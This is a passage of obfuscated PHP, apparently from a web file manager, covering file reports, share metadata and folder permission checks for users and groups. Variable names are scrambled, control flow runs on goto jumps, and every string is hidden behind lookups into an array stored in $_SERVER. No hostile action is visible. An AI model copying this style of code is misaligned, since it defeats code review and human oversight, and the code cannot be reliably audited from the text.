$dÓªƒà‹–ä = $FêŒ ÓÄ[$d•ŸÉ£àñ‚[394]]; $FêŒ ÓÄ[$d•ŸÉ£àñ‚[85]] = $AÏŒ¿‚Æ±[$dÓªƒà‹–ä] ? $AÏŒ¿‚Æ±[$dÓªƒà‹–ä] : !1; if ($FêŒ ÓÄ[$d•ŸÉ£àñ‚[85]][$d•ŸÉ£àñ‚[421]] == $d•ŸÉ£àñ‚[87]) { unset($EÜ¦Òîõ·[$EÄÈùàïÅ±]); } if ($FêŒ ÓÄ[$d•ŸÉ£àñ‚[85]] != $d•ŸÉ£àñ‚[495] && !$FêŒ ÓÄ[$d•ŸÉ£àñ‚[85]]) { unset($EÜ¦Òîõ·[$EÄÈùàïÅ±]); } } goto EøÉßùÉÔ˜; C°ãÙÁº: } private function _makeOrder($A«‚é”Õ” = '') { goto Bñ‰¶ùÒä¡; dÉùò–Ç¬: $A«‚é”Õ” = $A«‚é”Õ” . "{$Bé™„ÜÁ‡½}\x20{$cô¼²âøÚ}"; return $this->order($A«‚é”Õ”); goto Bùª…Ç†¿å; A©ê¯Â¶Ê„: $Bé™„ÜÁ‡½ = Input::get($F…Ì½®ã¢§[433], $F…Ì½®ã¢§[7], $F…Ì½®ã¢§[414], $DŞİÅê ×‹); $cô¼²âøÚ = Input::get($F…Ì½®ã¢§[434], $F…Ì½®ã¢§[7], $F…Ì½®ã¢§[1829], array($F…Ì½®ã¢§[1753], $F…Ì½®ã¢§[428])); $cô¼²âøÚ = $dç‰õÛßÓê[$cô¼²âøÚ]; goto dÉùò–Ç¬; Bñ‰¶ùÒä¡: $F…Ì½®ã¢§ =& $_SERVER[Ïº«‚ßèÔˆø]; $DŞİÅê ×‹ = array($F…Ì½®ã¢§[193], $F…Ì½®ã¢§[474], $F…Ì½®ã¢§[1817], $F…Ì½®ã¢§[1818]); $dç‰õÛßÓê = array($F…Ì½®ã¢§[426] => $F…Ì½®ã¢§[427], $F…Ì½®ã¢§[428] => $F…Ì½®ã¢§[429]); goto A©ê¯Â¶Ê„; Bùª…Ç†¿å: } public function reportAdd($aÎù¥ÃÊ) { $eìîÚŒÚå¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fğ‚êœæ© = array($eìîÚŒÚå¼[466] => $aÎù¥ÃÊ[$eìîÚŒÚå¼[466]], $eìîÚŒÚå¼[1508] => USER_ID); if (Model($eìîÚŒÚå¼[1825])->where($Fğ‚êœæ©)->find()) { return !1; } $Aù«¾¸µµ = array($eìîÚŒÚå¼[466] => $aÎù¥ÃÊ[$eìîÚŒÚå¼[466]], $eìîÚŒÚå¼[1414] => $aÎù¥ÃÊ[$eìîÚŒÚå¼[1414]], $eìîÚŒÚå¼[394] => $aÎù¥ÃÊ[$eìîÚŒÚå¼[394]], $eìîÚŒÚå¼[445] => $aÎù¥ÃÊ[$eìîÚŒÚå¼[445]], $eìîÚŒÚå¼[1508] => USER_ID, $eìîÚŒÚå¼[29] => $aÎù¥ÃÊ[$eìîÚŒÚå¼[29]], $eìîÚŒÚå¼[429] => $aÎù¥ÃÊ[$eìîÚŒÚå¼[429]]); return Model($eìîÚŒÚå¼[1825])->add($Aù«¾¸µµ); } public function reportList($a¦ïæšàÄ…) { goto cŞ´‘‹òÏ; fÚö„³ø¶´: $this->_listDataApply($f…±áˆˆÈ²[$C‡†‘Äƒé[366]]); return $f…±áˆˆÈ²; goto f‹ÆçµŸ; cÉÆ—‘Ã: $dÌÇŠ¾¨ùõ = array($C‡†‘Äƒé[426] => $C‡†‘Äƒé[427], $C‡†‘Äƒé[428] => $C‡†‘Äƒé[429]); $Bî…ğ±Œß = $C‡†‘Äƒé[1834] . $dÌÇŠ¾¨ùõ[$b”Öãëï‰›]; $f…±áˆˆÈ² = Model($C‡†‘Äƒé[1825])->where($BÒ³ƒŠÈ×)->order($Bî…ğ±Œß)->selectPage(20); goto A…ïÎµÌùÌ; cŞ´‘‹òÏ: $C‡†‘Äƒé =& $_SERVER[Ïº«‚ßèÔˆø]; $BÒ³ƒŠÈ× = array(); if ($a¦ïæšàÄ…[$C‡†‘Äƒé[705]]) { $dîç…Œ¯À‘ = $a¦ïæšàÄ…[$C‡†‘Äƒé[474]] ? $a¦ïæšàÄ…[$C‡†‘Äƒé[474]] : strtotime(date($C‡†‘Äƒé[1827])); $BÒ³ƒŠÈ×[$C‡†‘Äƒé[193]] = array($C‡†‘Äƒé[330], array($a¦ïæšàÄ…[$C‡†‘Äƒé[705]], $dîç…Œ¯À‘)); } goto EõÊ»îÅñ³; EõÊ»îÅñ³: if (isset($a¦ïæšàÄ…[$C‡†‘Äƒé[29]]) && in_array($a¦ïæšàÄ…[$C‡†‘Äƒé[29]], array($C‡†‘Äƒé[87], $C‡†‘Äƒé[1830], $C‡†‘Äƒé[1831], $C‡†‘Äƒé[1832], $C‡†‘Äƒé[1833]))) { $BÒ³ƒŠÈ×[$C‡†‘Äƒé[29]] = $a¦ïæšàÄ…[$C‡†‘Äƒé[29]]; } if (isset($a¦ïæšàÄ…[$C‡†‘Äƒé[697]]) && in_array($a¦ïæšàÄ…[$C‡†‘Äƒé[697]], array($C‡†‘Äƒé[495], $C‡†‘Äƒé[87], $C‡†‘Äƒé[1830], $C‡†‘Äƒé[1831]))) { $BÒ³ƒŠÈ×[$C‡†‘Äƒé[697]] = $a¦ïæšàÄ…[$C‡†‘Äƒé[697]]; } $b”Öãëï‰› = Input::get($C‡†‘Äƒé[434], $C‡†‘Äƒé[7], $C‡†‘Äƒé[1829], array($C‡†‘Äƒé[1753], $C‡†‘Äƒé[428])); goto cÉÆ—‘Ã; A…ïÎµÌùÌ: if (empty($f…±áˆˆÈ²[$C‡†‘Äƒé[366]])) { return array(); } $càô˜‰íğ’ = array_to_keyvalue_group($f…±áˆˆÈ²[$C‡†‘Äƒé[366]], $C‡†‘Äƒé[697], $C‡†‘Äƒé[466]); if (!empty($càô˜‰íğ’[0])) { $a¦ïæšàÄ… = $càô˜‰íğ’[0]; $BÒ³ƒŠÈ× = array($C‡†‘Äƒé[466] => array($C‡†‘Äƒé[7], $a¦ïæšàÄ…)); $CŒŠ¶¶ÜÂ = $this->where($BÒ³ƒŠÈ×)->field($C‡†‘Äƒé[466])->select(); $CŒŠ¶¶ÜÂ = array_to_keyvalue($CŒŠ¶¶ÜÂ, $C‡†‘Äƒé[33], $C‡†‘Äƒé[466]); $Aé®ø‚ö¡ï = array_diff($a¦ïæšàÄ…, $CŒŠ¶¶ÜÂ); if (!empty($Aé®ø‚ö¡ï)) { foreach ($f…±áˆˆÈ²[$C‡†‘Äƒé[366]] as $d £œÓÉ‹á => $BøÉÒÊŠ¼œ) { if (in_array($BøÉÒÊŠ¼œ[$C‡†‘Äƒé[466]], $Aé®ø‚ö¡ï)) { unset($f…±áˆˆÈ²[$C‡†‘Äƒé[366]][$d £œÓÉ‹á]); } } } } goto fÚö„³ø¶´; f‹ÆçµŸ: } public function reportStatus($eŒ‡‡²È¿º) { goto d²çˆ‰ÀÏí; d²çˆ‰ÀÏí: $bÅ„ÎÆ—Â¬ =& $_SERVER[Ïº«‚ßèÔˆø]; $C­íØÅ¡§‘ = array($bÅ„ÎÆ—Â¬[392] => $eŒ‡‡²È¿º[$bÅ„ÎÆ—Â¬[392]]); $eäÂ½¶ø” = Model($bÅ„ÎÆ—Â¬[1825])->where($C­íØÅ¡§‘)->field($bÅ„ÎÆ—Â¬[1835])->find(); goto dš³ËÔ¦èŒ; D³‡‘ãˆ£: $c’ËòÆª = Model($bÅ„ÎÆ—Â¬[1825])->where($C­íØÅ¡§‘)->save($Bóæö²à¹); if ($eŒ‡‡²È¿º[$bÅ„ÎÆ—Â¬[697]] == $bÅ„ÎÆ—Â¬[1830]) { if ($eäÂ½¶ø”[$bÅ„ÎÆ—Â¬[445]] != $bÅ„ÎÆ—Â¬[495] && $this->shareFileMeta($eäÂ½¶ø”[$bÅ„ÎÆ—Â¬[445]])) { $this->shareFileMeta($eäÂ½¶ø”[$bÅ„ÎÆ—Â¬[445]], 0); } $this->remove($eäÂ½¶ø”[$bÅ„ÎÆ—Â¬[466]]); return !0; } if ($c’ËòÆª && $eŒ‡‡²È¿º[$bÅ„ÎÆ—Â¬[697]] == $bÅ„ÎÆ—Â¬[1831]) { $b˜Ãß‹ª = $Bóæö²à¹[$bÅ„ÎÆ—Â¬[697]] == $bÅ„ÎÆ—Â¬[1831] ? 1 : 0; $this->shareFileMeta($eäÂ½¶ø”[$bÅ„ÎÆ—Â¬[445]], $b˜Ãß‹ª); $this->removeByFile($eäÂ½¶ø”[$bÅ„ÎÆ—Â¬[445]]); } goto CŒ¾……; dš³ËÔ¦èŒ: if (!$eäÂ½¶ø”) { return !1; } $Bóæö²à¹ = array($bÅ„ÎÆ—Â¬[697] => $eŒ‡‡²È¿º[$bÅ„ÎÆ—Â¬[697]]); if ($eŒ‡‡²È¿º[$bÅ„ÎÆ—Â¬[697]] == $bÅ„ÎÆ—Â¬[1831] && $eäÂ½¶ø”[$bÅ„ÎÆ—Â¬[697]] == $bÅ„ÎÆ—Â¬[1831]) { $Bóæö²à¹[$bÅ„ÎÆ—Â¬[697]] = 0; } goto D³‡‘ãˆ£; CŒ¾……: return $c’ËòÆª; goto fŠ—ğÜäÉô; fŠ—ğÜäÉô: } private function removeByFile($e–ÁÛ×ßÇÌ) { goto déÃèğ¦¸Ó; Eè­È¨ãóË: $E•—¼ŞÛ¯¶ = array($f„¡·×Ûç¢[394] => array($f„¡·×Ûç¢[7], $dâƒ‚µ¯åÁ), $f„¡·×Ûç¢[471] => 1); $D…½¬¤ÇÕò = $this->where($E•—¼ŞÛ¯¶)->field($f„¡·×Ûç¢[466])->select(); if (empty($D…½¬¤ÇÕò)) { return; } goto F×‹‡Ê‡ÒÎ; déÃèğ¦¸Ó: $f„¡·×Ûç¢ =& $_SERVER[Ïº«‚ßèÔˆø]; $D…½¬¤ÇÕò = Model($f„¡·×Ûç¢[782])->where(array($f„¡·×Ûç¢[445] => $e–ÁÛ×ßÇÌ))->field($f„¡·×Ûç¢[394])->select(); $dâƒ‚µ¯åÁ = array_to_keyvalue($D…½¬¤ÇÕò, $f„¡·×Ûç¢[33], $f„¡·×Ûç¢[394]); goto Eè­È¨ãóË; F×‹‡Ê‡ÒÎ: $CÓ©ºÑ•Öé = array_to_keyvalue($D…½¬¤ÇÕò, $f„¡·×Ûç¢[33], $f„¡·×Ûç¢[466]); $this->remove($CÓ©ºÑ•Öé); goto cß®¬ºÉ»÷; cß®¬ºÉ»÷: } private function shareFileMeta($C‹í—¸¿², $Aî„ÂôŠˆ = null) { $D×Ë›×ëÔ =& $_SERVER[Ïº«‚ßèÔˆø]; $eéİÓˆéå– = array($D×Ë›×ëÔ[445] => $C‹í—¸¿², $D×Ë›×ëÔ[93] => $D×Ë›×ëÔ[1836]); if (is_null($Aî„ÂôŠˆ)) { return Model($D×Ë›×ëÔ[1837])->where($eéİÓˆéå–)->find(); } $eéİÓˆéå–[$D×Ë›×ëÔ[371]] = $Aî„ÂôŠˆ; Model($D×Ë›×ëÔ[1837])->add($eéİÓˆéå–, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\x65\137\141\x75\164\150"; public function getAuth($E×ÇÌëÜ ‹) { goto bƒÌíÜ’ù; A¡ËÀ÷ÒÉã: array_multisort($F›Ë’éøá, SORT_DESC, $Fòìîƒé»); return $Fòìîƒé»; goto F‹¾¾ÅğÒ; bƒÌíÜ’ù: $DÊñ„šÅ£ =& $_SERVER[Ïº«‚ßèÔˆø]; $e¢ëÓ†Âää = $this->sourceAuthSelect($E×ÇÌëÜ ‹); $Fòìîƒé» = array(); goto bäÖ¨ç•§˜; bäÖ¨ç•§˜: $F›Ë’éøá = array(); $fßÌÆÜ©…« = 2 << 25; foreach ($e¢ëÓ†Âää as $d‡Œ£İŒß£) { goto fšÒ°¯Ê‹«; f‡É·÷ºÓ¢: $C‡öƒ»×ç‰ = 0; if ($d‡Œ£İŒß£[$DÊñ„šÅ£[402]] == SourceModel::TYPE_GROUP) { $C‡öƒ»×ç‰ = $fßÌÆÜ©…« * 2; } if ($d‡Œ£İŒß£[$DÊñ„šÅ£[402]] == SourceModel::TYPE_USER) { $C‡öƒ»×ç‰ = $fßÌÆÜ©…«; } goto ağó¹í¨ÒŸ; ağó¹í¨ÒŸ: if ($d‡Œ£İŒß£[$DÊñ„šÅ£[402]] == SourceModel::TYPE_USER && $d‡Œ£İŒß£[$DÊñ„šÅ£[482]] == $DÊñ„šÅ£[495]) { $C‡öƒ»×ç‰ = 0; } $F›Ë’éøá[] = $FîÀ¿××ŒÛ[$DÊñ„šÅ£[404]] + $C‡öƒ»×ç‰; goto Bç¤¡ƒË˜; fšÒ°¯Ê‹«: $FîÀ¿××ŒÛ = Model($DÊñ„šÅ£[1838])->listData($d‡Œ£İŒß£[$DÊñ„šÅ£[1766]]); if (!$FîÀ¿××ŒÛ) { continue; } $Fòìîƒé»[] = $d‡Œ£İŒß£; goto f‡É·÷ºÓ¢; Bç¤¡ƒË˜: } goto A¡ËÀ÷ÒÉã; F‹¾¾ÅğÒ: } public function sourceAuthSelect($B´ŸÈ«‹Á‡) { goto D†Úˆ­£¼; cÊß•°ÀÄƒ: if ($bÍÚÉãƒ ö) { return $a¸··Íœî«; } return $b‘åößĞÜ; goto bâ‚ßĞÛÔì; Bˆ¬ó³¯µ: $a¸··Íœî« = $this->field($F¤º±Ç¿ÏÖ)->order($BÇ¾´¢õµ[392])->where($b˜ŒÀŠÅ“‡)->select(); $b‘åößĞÜ = array_to_keyvalue_group($a¸··Íœî«, $BÇ¾´¢õµ[394]); foreach ($B´ŸÈ«‹Á‡ as $fñ•Õ•îÔµ) { $eå®—•éäî[$fñ•Õ•îÔµ] = $b‘åößĞÜ[$fñ•Õ•îÔµ] ? $b‘åößĞÜ[$fñ•Õ•îÔµ] : array(); } goto cÊß•°ÀÄƒ; FœâÉâçÀå: if (count($eçŸîÌ¼ğÃ) == count($B´ŸÈ«‹Á‡)) { return $bÍÚÉãƒ ö ? $eçŸîÌ¼ğÃ[$B´ŸÈ«‹Á‡[0]] : $eçŸîÌ¼ğÃ; } $F¤º±Ç¿ÏÖ = $BÇ¾´¢õµ[1839]; $b˜ŒÀŠÅ“‡ = array($BÇ¾´¢õµ[394] => array($BÇ¾´¢õµ[7], $B´ŸÈ«‹Á‡)); goto Bˆ¬ó³¯µ; D†Úˆ­£¼: $BÇ¾´¢õµ =& $_SERVER[Ïº«‚ßèÔˆø]; static $eå®—•éäî = array(); $bÍÚÉãƒ ö = is_array($B´ŸÈ«‹Á‡) ? !1 : !0; goto c‰ê‰òõ«; c‰ê‰òõ«: if ($bÍÚÉãƒ ö) { $B´ŸÈ«‹Á‡ = array($B´ŸÈ«‹Á‡); } $eçŸîÌ¼ğÃ = array(); foreach ($B´ŸÈ«‹Á‡ as $fñ•Õ•îÔµ) { if (isset($eå®—•éäî[$fñ•Õ•îÔµ])) { $eçŸîÌ¼ğÃ[$fñ•Õ•îÔµ] = $eå®—•éäî[$fñ•Õ•îÔµ]; } } goto FœâÉâçÀå; bâ‚ßĞÛÔì: } public function setAuth($AĞõ‚²¼©, $A—”¾­Ù‘˜) { goto Dè¡¥¸Š ; eÓ©ö‹–Üµ: if ($CŠæ¾Ê·¦ != $FÛòŒ»Şğï) { $Fó§Š‡Ï¦ = array($EË…êßíÁ[1671] => $CŠæ¾Ê·¦); $aó¼øÈ˜© = Model($EË…êßíÁ[1752])->field($EË…êßíÁ[1508])->where($Fó§Š‡Ï¦)->select(); $aó¼øÈ˜© = array_to_keyvalue($aó¼øÈ˜©, $EË…êßíÁ[33], $EË…êßíÁ[1508]); } $bÒ¢ê‚à§Ï = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $bÆ¿Ö»­‹ = array(); goto Cñ…ÖÙà»; dÃ„éÖš»ó: return !0; goto bŠ¥¾†¯Æ; Dè¡¥¸Š : $EË…êßíÁ =& $_SERVER[Ïº«‚ßèÔˆø]; $e·ƒËíŒÔ = Model($EË…êßíÁ[1187])->sourceInfo($AĞõ‚²¼©); if (!$e·ƒËíŒÔ) { return !1; } goto b¿°¸×…¢¶; Cñ…ÖÙà»: foreach ($A—”¾­Ù‘˜ as $e¾Í­‘¢êë) { if (!in_array($e¾Í­‘¢êë[$EË…êßíÁ[402]], $bÒ¢ê‚à§Ï)) { show_json(LNG($EË…êßíÁ[1840]), !1); } if ($CŠæ¾Ê·¦ != $FÛòŒ»Şğï) { if ($e¾Í­‘¢êë[$EË…êßíÁ[402]] == SourceModel::TYPE_GROUP) { } if ($e¾Í­‘¢êë[$EË…êßíÁ[482]] != 0 && !in_array($e¾Í­‘¢êë[$EË…êßíÁ[482]], $aó¼øÈ˜©)) { } } if ($e¾Í­‘¢êë[$EË…êßíÁ[482]] == 0) { $e¾Í­‘¢êë[$EË…êßíÁ[402]] = SourceModel::TYPE_USER; } $bÆ¿Ö»­‹[] = array($EË…êßíÁ[394] => $AĞõ‚²¼©, $EË…êßíÁ[402] => intval($e¾Í­‘¢êë[$EË…êßíÁ[402]]), $EË…êßíÁ[482] => intval($e¾Í­‘¢êë[$EË…êßíÁ[482]]), $EË…êßíÁ[1766] => intval($e¾Í­‘¢êë[$EË…êßíÁ[1766]]) ? intval($e¾Í­‘¢êë[$EË…êßíÁ[1766]]) : 0, $EË…êßíÁ[1820] => intval($e¾Í­‘¢êë[$EË…êßíÁ[1820]]) ? intval($e¾Í­‘¢êë[$EË…êßíÁ[1820]]) : -1); } $this->where(array($EË…êßíÁ[408] => $AĞõ‚²¼©))->delete(); $this->addAll($bÆ¿Ö»­‹); goto dÃ„éÖš»ó; b¿°¸×…¢¶: if ($e·ƒËíŒÔ[$EË…êßíÁ[402]] != SourceModel::TYPE_GROUP) { return !1; } $FÛòŒ»Şğï = 1; $CŠæ¾Ê·¦ = $e·ƒËíŒÔ[$EË…êßíÁ[482]]; goto eÓ©ö‹–Üµ; bŠ¥¾†¯Æ: } public function authClear($DÅ±ƒêÍ«¯) { $Bôğî¤¨Š =& $_SERVER[Ïº«‚ßèÔˆø]; $d·²ÙÊ‰±Û = Model($Bôğî¤¨Š[1187])->sourceInfo($DÅ±ƒêÍ«¯); $A¹•”ÖíÙÜ = array($DÅ±ƒêÍ«¯); if ($d·²ÙÊ‰±Û[$Bôğî¤¨Š[401]] == $Bôğî¤¨Š[87]) { $B—¯Åñòî = array($Bôğî¤¨Š[552] => array($Bôğî¤¨Š[511], $d·²ÙÊ‰±Û[$Bôğî¤¨Š[485]] . $DÅ±ƒêÍ«¯ . $Bôğî¤¨Š[512])); $A¹•”ÖíÙÜ = Model($Bôğî¤¨Š[1187])->field($Bôğî¤¨Š[408])->where($B—¯Åñòî)->getField($Bôğî¤¨Š[394], !0); $A¹•”ÖíÙÜ[] = $DÅ±ƒêÍ«¯; } $this->where(array($Bôğî¤¨Š[408] => array($Bôğî¤¨Š[409], $A¹•”ÖíÙÜ)))->delete(); return !0; } public function getAllChildren($F‘ÈŒÍ£°¢) { goto b„å©â·ï²; b„å©â·ï²: $f¹§´µàôŞ =& $_SERVER[Ïº«‚ßèÔˆø]; $D¢Ğ¯¬—Ê‰ = Model($f¹§´µàôŞ[1187])->sourceInfo($F‘ÈŒÍ£°¢); if ($D¢Ğ¯¬—Ê‰[$f¹§´µàôŞ[401]] != $f¹§´µàôŞ[87]) { return $this->sourceListAuth(array($F‘ÈŒÍ£°¢)); } goto AÇğ¡öí; b½“ÏëŸ·ã: $aËÁŒ™£ = Model($f¹§´µàôŞ[782])->field($EïÕ®½„ç”)->where($A‰§øÊ…Í¿)->select(); $cÆÓ¼ï•¢ = array($F‘ÈŒÍ£°¢); foreach ($aËÁŒ™£ as $B¿˜•„•Ò) { foreach ($Aîö¶èé›¹ as $CÒİæÎæÚ) { $CÀ÷»‡‡³• = $f¹§´µàôŞ[47] . $CÒİæÎæÚ . $f¹§´µàôŞ[47]; $bƒŒ‚ª°º¥ = $B¿˜•„•Ò[$f¹§´µàôŞ[485]] . $B¿˜•„•Ò[$f¹§´µàôŞ[394]] . $f¹§´µàôŞ[47]; if (strstr($bƒŒ‚ª°º¥, $CÀ÷»‡‡³•)) { $cÆÓ¼ï•¢[] = $B¿˜•„•Ò[$f¹§´µàôŞ[394]]; break; } } } goto EÑ½ëïÎá¬; AàİÇ¢Ôö×: if ($D¢Ğ¯¬—Ê‰[$f¹§´µàôŞ[476]] == $f¹§´µàôŞ[495] && $D¢Ğ¯¬—Ê‰[$f¹§´µàôŞ[482]] != $cš²À¤Õğ…) { $Aîö¶èé›¹ = $this->groupChidldAllRootSource($D¢Ğ¯¬—Ê‰[$f¹§´µàôŞ[482]]); } $dÔ×ïÃÀ£¶ = $this->field($f¹§´µàôŞ[394])->group($f¹§´µàôŞ[394])->select(); $dÔ×ïÃÀ£¶ = array_to_keyvalue($dÔ×ïÃÀ£¶, $f¹§´µàôŞ[33], $f¹§´µàôŞ[394]); goto C²Ø¥Ç ê—; EÑ½ëïÎá¬: return $this->sourceListAuth($cÆÓ¼ï•¢); goto EàèÑ¢Œò; AÇğ¡öí: if ($D¢Ğ¯¬—Ê‰[$f¹§´µàôŞ[402]] != SourceModel::TYPE_GROUP) { return array(); } $cš²À¤Õğ… = 1; $Aîö¶èé›¹ = array($F‘ÈŒÍ£°¢); goto AàİÇ¢Ôö×; C²Ø¥Ç ê—: if (!$dÔ×ïÃÀ£¶) { return array(); } $EïÕ®½„ç” = $f¹§´µàôŞ[1841]; $A‰§øÊ…Í¿ = array($f¹§´µàôŞ[394] => array($f¹§´µàôŞ[7], $dÔ×ïÃÀ£¶), $f¹§´µàôŞ[421] => $f¹§´µàôŞ[495]); goto b½“ÏëŸ·ã; EàèÑ¢Œò: } private function sourceListAuth($AÚœˆ½’ì—) { goto dßÓ÷öŠˆ; dßÓ÷öŠˆ: $f¬º©¤£ŒØ =& $_SERVER[Ïº«‚ßèÔˆø]; $f©Â†Åœ­Ö = Model($f¬º©¤£ŒØ[1187])->sourceListInfo($AÚœˆ½’ì—, !0); $Bé¨œÜŞ´Ö = $this->sourceAuthSelect($AÚœˆ½’ì—); goto cà¬ä°ŞÖ; cà¬ä°ŞÖ: $eÇÖë£Íäí = array(); $Dò¹Ñ¥£§‡ = array(); foreach ($f©Â†Åœ­Ö as $C«‚†Ì„³Í) { goto eÒ™×ªš÷Ù; eìè«¦óö¾: $A„÷§íË†æ = count(explode($f¬º©¤£ŒØ[8], trim($C«‚†Ì„³Í[$f¬º©¤£ŒØ[493]], $f¬º©¤£ŒØ[8]))); $Dò¹Ñ¥£§‡[] = $A„÷§íË†æ + ($C«‚†Ì„³Í[$f¬º©¤£ŒØ[29]] == $f¬º©¤£ŒØ[77] ? 0 : 1000); goto fÏ÷Ö¾öÅŒ; aÉ„å¡‘¯: unset($C«‚†Ì„³Í[$f¬º©¤£ŒØ[85]]); $DÁòàŸÑ¦” = $Bé¨œÜŞ´Ö[$C«‚†Ì„³Í[$f¬º©¤£ŒØ[394]]]; if (!$DÁòàŸÑ¦”) { continue; } goto e‡™ç´áïš; e‡™ç´áïš: $C«‚†Ì„³Í[$f¬º©¤£ŒØ[1842]] = $this->authTargetInfo($DÁòàŸÑ¦”); $C«‚†Ì„³Í[$f¬º©¤£ŒØ[493]] = rtrim($C«‚†Ì„³Í[$f¬º©¤£ŒØ[488]], $f¬º©¤£ŒØ[8]) . $f¬º©¤£ŒØ[8] . ltrim($C«‚†Ì„³Í[$f¬º©¤£ŒØ[493]], $f¬º©¤£ŒØ[8]); $eÇÖë£Íäí[] = $C«‚†Ì„³Í; goto eìè«¦óö¾; eÒ™×ªš÷Ù: unset($C«‚†Ì„³Í[$f¬º©¤£ŒØ[432]]); unset($C«‚†Ì„³Í[$f¬º©¤£ŒØ[430]]); unset($C«‚†Ì„³Í[$f¬º©¤£ŒØ[404]]); goto aÉ„å¡‘¯; fÏ÷Ö¾öÅŒ: } goto fã’ÔÂÍ“ä; fã’ÔÂÍ“ä: array_multisort($Dò¹Ñ¥£§‡, SORT_ASC, $eÇÖë£Íäí); return $eÇÖë£Íäí; goto Fì±Å‚·æà; Fì±Å‚·æà: } private function groupChidldAllRootSource($FÒî¾ñ£) { $A¯ìÓ‚ÇòÈ =& $_SERVER[Ïº«‚ßèÔˆø]; $fÂğì¦Ö• = Model($A¯ìÓ‚ÇòÈ[1843])->groupChildrenAll($FÒî¾ñ£); $F’Ñ™òò = array($A¯ìÓ‚ÇòÈ[476] => 0, $A¯ìÓ‚ÇòÈ[482] => array($A¯ìÓ‚ÇòÈ[7], $fÂğì¦Ö•), $A¯ìÓ‚ÇòÈ[402] => SourceModel::TYPE_GROUP); $b‹ªÊÑë = Model($A¯ìÓ‚ÇòÈ[782])->field($A¯ìÓ‚ÇòÈ[394])->where($F’Ñ™òò)->select(); $b‹ªÊÑë = array_to_keyvalue($b‹ªÊÑë, $A¯ìÓ‚ÇòÈ[33], $A¯ìÓ‚ÇòÈ[394]); return $b‹ªÊÑë; } private function authTargetInfo($F÷ ÜÆÍ›) { goto Cª‹™™Ç†; a·Àññ¬‡…: return $cÕƒá§ÒÖ½; goto dÅ½ÍĞÖä¥; Fğğ‰¥ó“Õ: $ağãì¯©Ñª = 2 << 25; foreach ($F÷ ÜÆÍ› as $e‡Ş¶•ª§Ç) { goto e—–óé³¡; FŠ¼ÛÅÏƒ: if ($e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[402]] == SourceModel::TYPE_USER && $e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[482]] == $aÆ†š§‰¾Ö[495]) { $déêÀğÅˆ§ = 0; } $Bìà¨äÛùÀ[] = $dæ¨èµåæ¯[$aÆ†š§‰¾Ö[404]] + $déêÀğÅˆ§; goto F¨š‹Üƒ; AÕóœ°Æè•: $déêÀğÅˆ§ = 0; if ($e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[402]] == SourceModel::TYPE_GROUP) { $déêÀğÅˆ§ = $ağãì¯©Ñª * 2; } if ($e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[402]] == SourceModel::TYPE_USER) { $déêÀğÅˆ§ = $ağãì¯©Ñª; } goto FŠ¼ÛÅÏƒ; e—–óé³¡: $dæ¨èµåæ¯ = Model($aÆ†š§‰¾Ö[1838])->listData($e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[1766]]); if (!$dæ¨èµåæ¯) { continue; } if ($e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[402]] == SourceModel::TYPE_USER) { $e«İœ²ƒÆÊ = Model($aÆ†š§‰¾Ö[501])->getInfoSimpleOuter($e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[482]]); if ($e«İœ²ƒÆÊ[$aÆ†š§‰¾Ö[1508]] == $aÆ†š§‰¾Ö[1068]) { continue; } if ($e«İœ²ƒÆÊ[$aÆ†š§‰¾Ö[1508]] == $aÆ†š§‰¾Ö[495]) { $e«İœ²ƒÆÊ[$aÆ†š§‰¾Ö[28]] = LNG($aÆ†š§‰¾Ö[1844]); } } else { $e«İœ²ƒÆÊ = Model($aÆ†š§‰¾Ö[484])->getInfoSimple($e‡Ş¶•ª§Ç[$aÆ†š§‰¾Ö[482]]); } goto eÂñâ†àÉŠ; eÂñâ†àÉŠ: if (!$e«İœ²ƒÆÊ) { continue; } $e«İœ²ƒÆÊ[$aÆ†š§‰¾Ö[444]] = $dæ¨èµåæ¯; $cÕƒá§ÒÖ½[] = $e«İœ²ƒÆÊ; goto AÕóœ°Æè•; F¨š‹Üƒ: } array_multisort($Bìà¨äÛùÀ, SORT_DESC, $cÕƒá§ÒÖ½); goto a·Àññ¬‡…; Cª‹™™Ç†: $aÆ†š§‰¾Ö =& $_SERVER[Ïº«‚ßèÔˆø]; $cÕƒá§ÒÖ½ = array(); $Bìà¨äÛùÀ = array(); goto Fğğ‰¥ó“Õ; dÅ½ÍĞÖä¥: } public function getAllChildrenByUser($eŒ‚ÜÉ©Ö‚, $EİœĞ¼ÑÁë) { goto EÙªï«­ù˜; dóõ°¹â¸·: if ($c«¤©Û‹‘­[$fñ¸‹©Û”ñ[476]] == $fñ¸‹©Û”ñ[495] && $c«¤©Û‹‘­[$fñ¸‹©Û”ñ[482]] != $BŠä„¬¯ø && $this->groupContainUser($c«¤©Û‹‘­[$fñ¸‹©Û”ñ[482]], $EİœĞ¼ÑÁë)) { foreach ($D¸ùã””÷[$fñ¸‹©Û”ñ[1845]] as $EŠ×ÊÅàõ¨) { $dÀ©“èáò = Model($fñ¸‹©Û”ñ[484])->getInfo($EŠ×ÊÅàõ¨[$fñ¸‹©Û”ñ[1671]]); $béŒÔ¿Ñêã = Model($fñ¸‹©Û”ñ[505])->getInfoSimpleOuter($EİœĞ¼ÑÁë); $béŒÔ¿Ñêã[$fñ¸‹©Û”ñ[444]] = $EŠ×ÊÅàõ¨[$fñ¸‹©Û”ñ[404]]; if (Model($fñ¸‹©Û”ñ[1838])->authCheckAction($EŠ×ÊÅàõ¨[$fñ¸‹©Û”ñ[404]][$fñ¸‹©Û”ñ[404]], $fñ¸‹©Û”ñ[1691])) { continue; } $f¬¾¾£íÙ¦ = array($fñ¸‹©Û”ñ[28] => $fñ¸‹©Û”ñ[1461] . $dÀ©“èáò[$fñ¸‹©Û”ñ[28]], $fñ¸‹©Û”ñ[394] => $dÀ©“èáò[$fñ¸‹©Û”ñ[85]][$fñ¸‹©Û”ñ[394]], $fñ¸‹©Û”ñ[76] => KodIO::make($dÀ©“èáò[$fñ¸‹©Û”ñ[85]][$fñ¸‹©Û”ñ[394]]), $fñ¸‹©Û”ñ[476] => $fñ¸‹©Û”ñ[495], $fñ¸‹©Û”ñ[402] 